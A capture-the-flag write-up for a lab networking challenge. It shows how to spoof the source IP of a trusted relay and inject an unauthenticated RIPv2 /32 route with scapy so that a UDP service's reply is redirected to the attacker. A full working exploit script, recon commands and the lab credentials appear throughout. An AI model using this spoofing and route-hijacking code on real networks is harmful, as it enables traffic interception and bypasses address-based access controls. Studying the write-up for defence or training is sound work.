# The Spine 5/5 — Hijack ("Take the address, and commit the fragment")

**Flag:** `reentry{m0r3_sp3c1f1c_r0ut3_st0l3_th3_c0mm1t}`
**Override fragment:** `KEPLER-OVR-6:a3d5940472fea4e5`

| | |
|---|---|
| Category | Networking / IP spoofing + unauthenticated routing protocol abuse (RIPv2) |
| Entry | `ssh eng@tcp.reentry.lol -p 30081` (password `halley`) |
| Segments | instruments `10.185.1.0/24` ↔ core `10.185.0.0/24` (through router `10.185.1.5`) |
| Assembler | `10.185.0.3:9700/udp` — **plain-text protocol, NOT MRDN!** |
| Trick | Spoof the source IP (= the relay's address) + inject a RIPv2 `/32` route, so the assembler's reply comes back to us, not to the real relay |

> **Challenge brief:** The override assembler sits in the core segment and takes commits from
> exactly one address — the station relay's. That address is a field you fill in yourself. The
> reply is the problem. It goes wherever the routing domain believes the relay lives, and the
> trunk's routing has never once asked who was talking. Take the address, and commit the fragment.

Reading between the lines (same idea as stage 1, but at Layer 3 instead of Layer 2):
- "takes commits from exactly one address" = **source-IP filter** (just like the relay filtered
  on MAC in stage 1);
- "that address is a field you fill in yourself" = **spoof the source IP** to the relay's
  (`10.185.1.2`);
- "the reply goes wherever routing believes the relay lives" = the assembler's reply goes to
  `10.185.1.2`, **not to us** — we must fix that at the routing level;
- "the trunk's routing never asked who was talking" = **RIP (Routing Information Protocol) has
  no authentication** → we can inject a fake route and redirect the traffic to ourselves;
- "commit the fragment" = send a `COMMIT` command with the token from stage 4.

---

## 1. Starting point — what we already know

From the previous stages:
- we are on the HALLEY laptop `10.185.1.4`, MAC cloned `02:4d:52:71:68:0d`, passwordless sudo;
- relay = `10.185.1.2` (bus `udp/9600`, mgmt `tcp/9601`);
- controller LAZARUS = `10.185.1.3`;
- **commit token** from stage 4: `AOC-6-1403d9b5`;
- **operator credential** from stage 3 (AUTH frame, `op=0x0a`, from the relay): `OPR-CF9F790AE4`;
- relay banner from stage 1: `assembler 10.185.0.0/24 (beyond the core router)`.

---

## 2. Find the assembler in the core segment

The core segment is not directly visible — you go through the router. Check if it is routable
from our host:

```bash
ssh eng@tcp.reentry.lol -p 30081          # halley
sudo nmap -sn 10.185.0.0/24
```

```
Nmap scan report for 10.185.0.2   (zebra/ripd router — like 10.185.1.5 in the instrument segment)
Nmap scan report for 10.185.0.3   (assembler candidate)
Nmap scan report for 10.185.0.5   (SSH, out of scope)
```

```bash
sudo nmap -p1-65535 -T4 --open 10.185.0.3   # no TCP
```

No open TCP on `.0.3` — like the LAZARUS controller in stage 3, the service only speaks UDP. A
UDP port sweep (sending probes with a **spoofed** source `10.185.1.2`, so any listener answers
at all — otherwise we get `REJECTED`) over `9590-9720` (near the known bus ports `9600-9602`)
reveals:

```
UDP REPLY from 10.185.0.3:9700 -> (our port) : "USAGE: COMMIT <operator-credential> <commit-token>\n"
```

**Assembler = `10.185.0.3:9700/udp`.** It even hands us the command format up front.

---

## 3. Prove the address filter

To confirm the filter is on the source IP, send the same command from **our real** address (no
spoofing) straight from Python (`socket.sendto`, no RIP needed — the reply comes to us because
the address is ours):

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(5)
s.sendto(b"COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5", ("10.185.0.3", 9700))
print(s.recvfrom(4096))
```

```
REJECTED origin 10.185.1.4 is not the station relay
```

**Confirmed:** the assembler checks the packet's source IP and only accepts `10.185.1.2` (the
relay). This is the Layer-3 analogue of the MAC allowlist from stage 1 — except this time we
must **fill in that field ourselves** (spoofing), because we cannot just change our interface's
IP the way we changed the MAC.

---

## 4. Spoof the source address (scapy)

Unlike a MAC (where `ip link set address` was enough), an IP cannot be "assigned" to the
interface and used with the normal network stack — you must build IP packets with a fake `src`
by hand in scapy and send them at Layer 2 (`sendp`):

```python
from scapy.all import *
IFACE = "eth0"
conf.iface = IFACE
mymac = get_if_hwaddr(IFACE)

payload = b"COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5"
pkt = IP(src="10.185.1.2", dst="10.185.0.3", ttl=64) / UDP(sport=9600, dport=9700) / Raw(load=payload)
sendp(Ether(src=mymac) / pkt, verbose=0)
```

The packet reaches the assembler, but the **assembler's reply goes to `10.185.1.2`** (the real
relay), because that is the `dst` of the reply UDP. We never see that packet — that is "the
reply is the problem" from the brief.

---

## 5. Hijack the return route — inject RIP

The core router (`10.185.0.2` / seen from the instrument segment as `10.185.1.5`) uses **RIPv2**
(`zebra`/`ripd`, port `520/udp` — we saw its consoles as open TCP `2601/2602` earlier). RIPv2
has **no authentication** in the default config — anyone can advertise any route and the router
accepts it.

Advertise to the router that `10.185.1.2/32` (specifically the relay's address — a **more
specific** route than its normal `/24`) is reachable **through us**. RIP picks the longest
prefix, so our `/32` beats the existing `/24`:

```python
import struct
def rip_announce(target_router="10.185.1.5"):
    # RIPv2 Response, one entry: 10.185.1.2/32, metric 1
    entry = (struct.pack("!HH", 2, 0)                      # AFI=2 (IP), route tag=0
             + bytes([10,185,1,2])                          # address: 10.185.1.2
             + bytes([255,255,255,255])                     # mask: /32
             + bytes([0,0,0,0])                              # next-hop: 0.0.0.0 (= sender)
             + struct.pack("!I", 1))                          # metric = 1
    rip_pkt = struct.pack("!BBH", 2, 2, 0) + entry           # command=2(Response), ver=2
    return IP(dst=target_router) / UDP(sport=520, dport=520) / Raw(load=rip_pkt)

# advertise continuously (RIP entries time out, so keep refreshing the route)
for _ in range(60):
    sendp(Ether(src=mymac) / rip_announce(), verbose=0)
    time.sleep(0.5)
```

After the injection, all traffic to `10.185.1.2` (including the assembler's reply) goes through
the router **to us**, not to the real relay.

---

## 6. KEY trap — the assembler does NOT speak MRDN

The rest of the bus (stages 2-4) used **MRDN** frames
(`MRDN|ver|op|term|seq|dlen|payload|crc16`). The natural first attempt is to wrap the `COMMIT`
command in such a frame:

```python
payload = b"COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5"
body = b"MRDN" + bytes([1, 0x8f, 7, 0, 0, len(payload)]) + payload   # op=0x8f COMMIT
# ...append CRC-16...
```

Result: **always** `USAGE: COMMIT <operator-credential> <commit-token>` — no matter whether the
credential and token are correct, no matter the opcode, no matter the term. Dozens of variants
were tested (with/without the `< >` brackets, relay IP as credential, MAC as credential, name
`RELAY-GW`, the stage-4 flag as "fragment", etc.) — all give the same USAGE message.

**Conclusion** (after noticing the `REJECTED origin ... is not the station relay` reply came as
plain text, NOT an MRDN frame): the assembler is a **completely different, much simpler service**
than the rest of the bus — a plain **text UDP protocol** of the "one command line → one reply
line" kind, with no MRDN, CRC, or opcode. Wrapping it in MRDN just adds a junk binary prefix that
breaks parsing.

### Correct call — plain text, no MRDN:

```python
payload = b"COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5"     # <-- RAW text, zero MRDN!
pkt = IP(src="10.185.1.2", dst="10.185.0.3", ttl=64) / UDP(sport=9600, dport=9700) / Raw(load=payload)
sendp(Ether(src=mymac) / pkt, verbose=0)
```

---

## 7. Full exploit (scapy)

```python
import struct, time, threading
from scapy.all import *

IFACE = "eth0"
conf.iface = IFACE
conf.sniff_promisc = True
mymac = get_if_hwaddr(IFACE)

RELAY   = "10.185.1.2"       # the address we "fill in ourselves" (spoofed source)
ASM_IP  = "10.185.0.3"
ASM_PORT= 9700
ROUTER  = "10.185.1.5"       # the RIP router between segments

# --- 1) inject a RIPv2 /32 route, so the reply comes back to us ---
def rip_announce():
    entry = (struct.pack("!HH", 2, 0)
             + bytes([10,185,1,2]) + bytes([255,255,255,255]) + bytes([0,0,0,0])
             + struct.pack("!I", 1))
    rip_pkt = struct.pack("!BBH", 2, 2, 0) + entry
    return IP(dst=ROUTER)/UDP(sport=520, dport=520)/Raw(load=rip_pkt)

stop = threading.Event()
def rip_loop():
    while not stop.is_set():
        sendp(Ether(src=mymac)/rip_announce(), verbose=0)
        time.sleep(0.4)

threading.Thread(target=rip_loop, daemon=True).start()
time.sleep(3)   # give the router time to accept the route

# --- 2) listen for the assembler's reply (it should now come to us) ---
replies = []
def capture(p):
    if IP in p and p[IP].src == ASM_IP and UDP in p and p[UDP].sport == ASM_PORT and Raw in p:
        replies.append(bytes(p[Raw].load))

sniffer = AsyncSniffer(iface=IFACE, prn=capture, store=0,
                        filter=f"udp and src host {ASM_IP} and src port {ASM_PORT}")
sniffer.start()
time.sleep(1)

# --- 3) spoofed COMMIT, PLAIN TEXT (no MRDN!) ---
payload = b"COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5"
pkt = IP(src=RELAY, dst=ASM_IP, ttl=64)/UDP(sport=9600, dport=ASM_PORT)/Raw(load=payload)
sendp(Ether(src=mymac)/pkt, verbose=0)

time.sleep(3)
sniffer.stop()
stop.set()

for r in replies:
    print(r.decode())
```

Result:

```
ACCEPTED reentry{m0r3_sp3c1f1c_r0ut3_st0l3_th3_c0mm1t} KEPLER-OVR-6:a3d5940472fea4e5
```

> ## 🏁 Flag: `reentry{m0r3_sp3c1f1c_r0ut3_st0l3_th3_c0mm1t}`
>
> Override fragment: `KEPLER-OVR-6:a3d5940472fea4e5`

---

## 8. Cleanup

```bash
sudo pkill -9 tcpdump
# stop the RIP loop (stop.set() in the script) — the /32 route expires naturally after ~180s
# without re-announce; optionally wait for it to expire instead of reverting by hand
```

---

## 9. TL;DR — command by command

```bash
ssh eng@tcp.reentry.lol -p 30081            # halley

# 1) find the assembler in the core segment
sudo nmap -sn 10.185.0.0/24                 # .0.2 router, .0.3 candidate, .0.5 ssh
sudo nmap -p1-65535 --open 10.185.0.3       # no TCP -> UDP service
# UDP port sweep with spoofed src=10.185.1.2 in 9590-9720 -> 9700 answers USAGE

# 2) confirm the address filter (no spoofing -> REJECTED naming the required address)
python3 -c "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(5);
s.sendto(b'COMMIT OPR-CF9F790AE4 AOC-6-1403d9b5',('10.185.0.3',9700));print(s.recvfrom(4096))"
#   REJECTED origin 10.185.1.4 is not the station relay

# 3) RIP /32 injection (10.185.1.2 via us) + spoofed PLAIN-TEXT (NOT MRDN!) COMMIT:
sudo python3 hijack.py
#   ACCEPTED reentry{m0r3_sp3c1f1c_r0ut3_st0l3_th3_c0mm1t} KEPLER-OVR-6:a3d5940472fea4e5
```

---

## 10. The point

Two independent weaknesses combined into one attack:

1. **An address allowlist with no cryptographic authentication** (here: source IP; in stage 1:
   source MAC). An address can always be forged at the layer where it is not cryptographically
   verified — scapy lets you send a packet with any `src` IP.
2. **RIP with no authentication** — any host on the segment can inject a route into the routing
   daemon and redirect traffic meant for another host to itself. This solves "how do I receive a
   reply sent to an address I spoofed" — **the more specific the route (`/32`), the higher the
   priority** in route selection, so it easily beats the existing `/24` entry.

Plus a hidden trap that is not about security but about the protocol itself: the assembler is
**not part of the MRDN bus** — it is a separate, simple text service. Trying to "generalize" the
stage 2-4 pattern (wrap everything in MRDN) leads down a false trail.

Hence the flag: *a more specific route stole the commit* — the `/32` route (more specific than
the relay's `/24`) "steals" the commit traffic meant for the real relay.

> **Previous:** [1](1%20-%20Patch%20In%20%28Trunk%20Access%29.md) · [2](2%20-%20Relay%20Firmware.md) · [3](3%20-%20Interpose.md) · [4](4%20-%20Rewrite.md)
>
> **The Spine: 5/5 — COMPLETE.** 🏁
